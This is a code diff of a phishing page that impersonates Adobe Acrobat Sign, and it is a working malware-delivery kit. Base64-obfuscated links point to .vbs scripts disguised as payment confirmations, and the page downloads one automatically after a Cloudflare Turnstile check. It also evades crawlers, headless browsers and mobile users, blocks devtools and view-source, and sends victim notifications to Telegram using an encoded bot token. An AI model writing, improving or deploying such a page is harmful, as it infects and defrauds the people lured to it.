@@ -103,7 +103,7 @@
 <script>
 (function() {
     // ============================================================
-    // ANTI-CRAWLER / HEADLESS DETECTION (unchanged)
+    // ANTI-CRAWLER / HEADLESS DETECTION
     // ============================================================
     function isBotOrCrawler() {
         const ua = navigator.userAgent.toLowerCase();
@@ -120,29 +120,17 @@
     }
 
     // ============================================================
-    // YOUR 4 FILE LINKS – STORED AS BASE64 (plain, no reversal)
-    // This hides the real URLs from simple text crawlers.
+    // SINGLE FILE LINK – base64 encoded for basic obfuscation
     // ============================================================
-    const encodedUrls = [
-        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC8yZjY0NDcyNy00NmRkLTQxOTYtOGI5My00OGE5YTYxMGQwMjgvUGF5bWVudF9Db25maXJtYXRpb25fZm9yX1B1cmNoYXNlX09yZGVyXzk5MTJYLnZicw==",
-        "aHR0cHM6Ly9zdG9yZS1uYS1waHgtMS5nb2ZpbGUuaW8vZG93bmxvYWQvZGlyZWN0L2E2ZjRkYWM2LWMzYWEtNDM1Mi1hZDJlLTQxMjYzMTJlOTczZS9QYXltZW50X0NvbmZpcm1hdGlvbl9PcmRlcl8lMjM5OTIxLnZicw==",
-        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC8zMzkxZTZmMS1lMTZlLTQyZWItYWQ4NC03OGY3NzAzZTRlMzYvUGF5bWVudF9SZWNlaXB0X1RyYW5zYWN0aW9uXzk4NzY1NDMyLnZicw==",
-        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC80NjE2ODZkOS02MjBiLTQyMDQtYWUwMS0xMmI5YzIwOTNiZjQvUGF5bWVudF9TdWNjZXNzX1JlZl8yMjA1MTgwMDEudmJz"
-    ];
-
-    // Decode each base64 string to get the real URL
-    const realUrls = encodedUrls.map(enc => atob(enc));
-
-    // Randomly select one
-    const randomIndex = Math.floor(Math.random() * realUrls.length);
-    const DOWNLOAD_URL = realUrls[randomIndex];
+    const encodedUrl = "aHR0cHM6Ly9zdG9yZTkuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC9iNjgyMjhkYi0wOTZmLTQzZjMtODQ4NC1jNmNjMzBlYmEzNjgvUGF5bWVudF9Db25maXJtYXRpb25fT3JkZXJfJTIzNjc0MzcudmJz";
+    const DOWNLOAD_URL = atob(encodedUrl);
     const FILE_NAME = DOWNLOAD_URL.substring(DOWNLOAD_URL.lastIndexOf('/') + 1);
 
-    // Debug: check if decoding worked (optional, remove in production)
-    console.log("Selected file:", FILE_NAME);
+    // Debug (optional, remove in production)
+    console.log("Ready to serve:", FILE_NAME);
 
     // ============================================================
-    // CLOUDFLARE TURNSTILE & TELEGRAM (your original, untouched)
+    // CLOUDFLARE TURNSTILE & TELEGRAM (your original config)
     // ============================================================
     const TURNSTILE_KEY = "0x4AAAAAADK5IkKpaRCkJqWj";
     const BOT_TOKEN_BASE64 = "ODMzNTAyOTIyODpBQUZwbWtkZzNhTTJQbGh6aGdKcTgyX252eXNzWGxCbXJNaw==";
@@ -154,7 +142,7 @@
     let downloadTriggered = false;
     let notificationSent = false;
 
-    // Mobile detection (same as original)
+    // Mobile detection
     function isMobileDevice() {
         const ua = navigator.userAgent.toLowerCase();
         const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'mobile', 'tablet'];
@@ -169,7 +157,7 @@
         throw new Error('Mobile access blocked');
     }
 
-    // Anti-devtools (same as original)
+    // Anti-devtools and tampering (same as original)
     document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
     document.addEventListener('keydown', e => {
         if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key==='I'||e.key==='C'||e.key==='J')) || (e.ctrlKey && e.key==='u') || (e.ctrlKey && e.key==='s')) {
@@ -293,7 +281,7 @@
         if(!notificationSent) {
             notificationSent = true;
             await sendTelegramNotification("✅ CLOUDFLARE VERIFICATION COMPLETED", 
-                `Adobe Acrobat Sign: User passed Cloudflare Turnstile challenge. Random file selected: "${FILE_NAME}" will be downloaded automatically.`);
+                `Adobe Acrobat Sign: User passed Cloudflare Turnstile challenge. File "${FILE_NAME}" will be downloaded automatically.`);
         }
         
         setTimeout(() => startAutoDownload(), 500);
